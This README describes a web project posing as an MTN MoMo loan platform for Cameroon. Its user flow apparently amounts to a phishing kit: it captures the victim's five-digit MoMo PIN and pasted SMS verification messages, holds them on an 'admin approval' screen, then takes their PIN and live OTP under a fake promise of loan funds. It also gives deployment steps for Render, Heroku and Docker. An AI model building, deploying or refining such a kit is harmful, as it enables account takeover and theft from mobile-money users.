# MTN MoMo Loans Platform - Cameroon

A modern loan application platform built specifically for MTN MoMo in Cameroon. Features a complete loan workflow with user registration, SMS verification, OTP authentication, and loan approval.

## 🎨 Features

✅ **English Language** - Complete English interface
✅ **MTN Colors** - Professional MTN branding (#003366 dark blue, #FFD700 gold)
✅ **Cameroon Localization** - +237 country code, XAF currency
✅ **Complete Loan Workflow**:
   - Landing page with loan calculator
   - 3-step application form
   - User login with 5-digit PIN
   - SMS message verification (user pastes SMS from phone)
   - Wait for admin approval
   - OTP verification (4-digit OTP + 5-digit PIN)
   - Loan approval confirmation

✅ **No Merchant PIN** - Removed the merchant PIN page after login
✅ **5-Digit PIN Requirement** - Secure 5-digit MoMo PIN
✅ **4-Digit OTP** - One-time password verification
✅ **Responsive Design** - Works on mobile and desktop
✅ **Modern UI** - Beautiful animations and transitions

## 📁 File Structure

```
mtn-momo-loans/
├── index.html           # Main UI (HTML/CSS/JavaScript)
├── server.js            # Express.js backend
├── database.js          # MongoDB operations
├── package.json         # Dependencies
├── .env.example         # Environment variables template
├── cleanup.js           # Database cleanup utility
└── README.md            # This file
```

## 🚀 Quick Start

### Prerequisites
- Node.js 18+
- MongoDB (local or Atlas)
- npm or yarn

### Installation

1. **Clone or download this project**
   ```bash
   cd mtn-momo-loans
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Setup environment variables**
   ```bash
   cp .env.example .env
   # Edit .env and add your MongoDB URI
   ```

4. **Start the server**
   ```bash
   npm start
   ```

5. **Open in browser**
   ```
   http://localhost:3000
   ```

## 🔄 User Flow

### Step 1: Landing Page
- View loan calculator
- See monthly payment estimates
- Click "START APPLICATION"

### Step 2: Application Form (3 Steps)
**Step 1:** Loan Details
- Loan Type
- Loan Amount (XAF)
- Loan Term
- Purpose

**Step 2:** Personal Information
- First Name
- Last Name
- Phone Number (+237, 9 digits)

**Step 3:** Financial Information
- Employment Status
- Annual Income
- Review Summary

### Step 3: Processing
- Application submitted
- Processing animation shows

### Step 4: User Login
- Phone number (+237 + 9 digits)
- 5-digit MoMo PIN
- Click LOGIN

### Step 5: SMS Verification
- User receives SMS with verification code
- User copies and pastes full SMS message
- Click SUBMIT
- Wait for admin approval

### Step 6: Admin Approval
- Waiting screen with animation
- Admin approves via backend
- User automatically proceeds

### Step 7: OTP Verification
- Enter 5-digit MoMo PIN
- Enter 4-digit OTP from MTN
- Click VERIFY & APPROVE LOAN

### Step 8: Loan Approved
- Success page with loan details
- Amount, term, monthly payment
- Funds will be deposited in 5 minutes

## 🔐 Authentication

### PIN Validation
- **Length**: 5 digits
- **Format**: All numeric
- **Input**: Split into 5 boxes
- **Features**: Show/hide toggle, delete button, backspace support

### OTP Validation
- **PIN**: 5 digits (same as login PIN)
- **OTP**: 4 digits (from MTN MoMo)
- **Features**: Auto-advance to next field, delete functionality

## 💱 Currency & Localization

- **Country**: Cameroon 🇨🇲
- **Phone Code**: +237
- **Currency**: XAF (Central African CFA franc)
- **Example Phone**: 670123456 (9 digits after +237)

## 🎯 Phone Number Format

**Accepted formats:**
- 9 digits: `670123456`
- Display: `+237 670 123 456`

**Common operators:**
- Orange: 670-676
- MTN: 650-655
- Nexttel: 690-699

## 📊 API Endpoints

All endpoints return JSON responses.

### POST /api/login-momo
Authenticate user with phone and PIN
```json
Request: { "phone": "670123456", "pin": "12345" }
Response: { "success": true, "appId": "APP..." }
```

### POST /api/parse-sms
Process SMS message from user
```json
Request: { "message": "Your MTN MoMo verification code is: 123456" }
Response: { "success": true, "message": "SMS parsed successfully." }
```

### POST /api/verify-otp
Verify OTP and PIN for loan approval
```json
Request: { 
  "applicationId": "APP...",
  "pin": "12345",
  "otp": "6789"
}
Response: { "success": true, "loanApproved": true }
```

### POST /api/submit-application
Save loan application to database
```json
Request: {
  "applicationId": "APP...",
  "loanType": "Business Loan",
  "loanAmount": 1000000,
  "loanTerm": "48 Months",
  "loanPurpose": "Business expansion",
  "firstName": "John",
  "lastName": "Doe",
  "phone": "670123456",
  "employment": "Self-employed",
  "annualIncome": 5000000
}
Response: { "success": true, "message": "Application saved." }
```

## 🛠️ Customization

### Change Colors
Edit in `index.html`:
```css
:root {
  --mtn-dark: #003366;    /* Dark blue */
  --mtn-gold: #FFD700;    /* Gold accent */
  /* ... other colors */
}
```

### Change Currency
Replace `XAF` with your currency throughout HTML

### Change Country Code
Replace `+237` with your country code in:
- HTML phone inputs
- JavaScript validation
- Server logs

### Change Terms & Conditions
Add your legal text in the appropriate footer sections

## 🗄️ Database

### Collections

**applications**
```javascript
{
  id: "APP...",
  loanType: "Business Loan",
  loanAmount: 1000000,
  loanTerm: "48 Months",
  loanPurpose: "...",
  firstName: "John",
  lastName: "Doe",
  phoneNumber: "670123456",
  employment: "Self-employed",
  annualIncome: 5000000,
  status: "pending_approval",
  pinStatus: "pending",
  otpStatus: "pending",
  timestamp: "2024-01-15T10:30:00Z"
}
```

### Database Operations

**Create indexes:**
```bash
npm run setup-db
```

**Clean database:**
```bash
# Delete all applications
node cleanup.js apps

# Delete all admins (except ADMIN001)
node cleanup.js admins

# Delete everything
node cleanup.js both
```

## 🚀 Deployment

### Render (Recommended)
1. Push to GitHub
2. Connect to Render
3. Add environment variables
4. Deploy!

### Heroku
```bash
heroku create your-app-name
heroku config:set MONGODB_URI=your_mongodb_uri
git push heroku main
```

### Docker
```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY . .
RUN npm install
EXPOSE 3000
CMD ["npm", "start"]
```

## 📱 Mobile Optimization

- ✅ Fully responsive
- ✅ Touch-friendly buttons
- ✅ Mobile keyboard support
- ✅ SMS-ready workflow
- ✅ Optimized for small screens

## 🔒 Security Notes

⚠️ **Important for Production:**
1. Use HTTPS only
2. Validate PIN server-side
3. Implement rate limiting
4. Add CSRF protection
5. Validate all inputs
6. Use environment variables
7. Implement proper logging
8. Add 2FA for admins
9. Encrypt sensitive data
10. Regular security audits

## 🐛 Troubleshooting

**Port already in use:**
```bash
# Use different port
PORT=3001 npm start
```

**MongoDB connection error:**
- Check MONGODB_URI in .env
- Verify IP whitelist on Atlas
- Check network connectivity

**SMS not sending:**
- Implement actual SMS integration
- Configure SMS provider (Twilio, etc.)
- Update `/api/parse-sms` endpoint

**OTP not working:**
- Integrate with MTN MoMo API
- Implement actual OTP validation
- Update `/api/verify-otp` endpoint

## 📚 API Integration Guide

### To integrate with real MTN MoMo API:

1. **Get MTN API credentials** from MTN Business Portal
2. **Update `/api/login-momo`** to call MTN auth
3. **Update `/api/verify-otp`** to validate against MTN
4. **Implement SMS delivery** via Twilio/AWS SNS
5. **Add webhook handling** for SMS callbacks

## 📞 Support

For issues or questions:
1. Check the troubleshooting section
2. Review error messages in browser console
3. Check server logs: `npm start`
4. Verify .env configuration

## 📄 License

MIT License - Feel free to use and modify

## 🙏 Credits

Built with ❤️ for MTN MoMo Cameroon

---

**Version:** 1.0.0  
**Last Updated:** 2024  
**Language:** English  
**Country:** Cameroon 🇨🇲  
**Currency:** XAF  
**Country Code:** +237
